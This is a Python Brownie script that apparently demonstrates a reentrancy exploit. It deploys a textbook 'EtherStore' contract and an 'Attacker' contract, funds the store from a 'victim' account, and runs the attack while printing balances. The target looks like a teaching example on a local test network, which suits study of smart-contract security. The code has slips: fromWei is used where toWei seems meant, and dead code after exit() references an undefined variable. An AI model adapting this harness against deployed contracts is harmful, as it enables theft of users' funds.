#!/usr/bin/env python
from brownie import EtherStore, accounts, Attacker  # type: ignore
from web3 import Web3 as w3


def deploy(account):
    store = EtherStore.deploy({"from": account})
    Attacker.deploy(store, {"from": account, "gas_limit": 1000000})


def deposite_in_store(victim, store=EtherStore[-1]):
    store.depositFunds({"from": victim, "value": w3.toWei(5, "ether")})


def get_balances():
    print("Attacker eth: ", Attacker[-1].balance())
    print("Store eth:", EtherStore[-1].balance())
    print("Attacker eth in Store:",
          EtherStore[-1].balances(Attacker[-1].address))


def deposite_in_attacker(account, attacker=Attacker[-1]):
    attacker.deposite({"from": account, "value": w3.toWei(2, "ether")})


def setup(account, victim):
    deploy(account)
    deposite_in_store(victim)
    # deposite_in_attacker(account)


def main():
    # accounts
    victim = accounts[1]
    account = accounts[0]
    # assign contracts
    store = EtherStore[-1]
    attacker = Attacker[-1]
    get_balances()
    print("========================\nExploiting...\n========================")
    attacker.attackEtherStore({"from": account, "value": w3.fromWei(
        3, "ether"), "gas_limit": 1000000, "gas_price": 300001800, "allow_revert": True})
    # attacker.attack({"from":account})
    get_balances()
    exit()
    # attack.withdraw(16000000000000000000,{"from":account})
    attack.deposite({"from": account, "value": w3.toWei(
        3, "ether"), "gas_limit": 1000000, "gas_price": 6721975, "allow_revert": True})
    account.transfer(attack, w3.toWei(1, "ether"),
                     gas_price=100000, gas_limit=6721975, allow_revert=True)
    print("atacker eth in store:", store.balances(attack.address))
    print("attacker eth: ", attack.balance())
    print("Store eth:", store.balance())
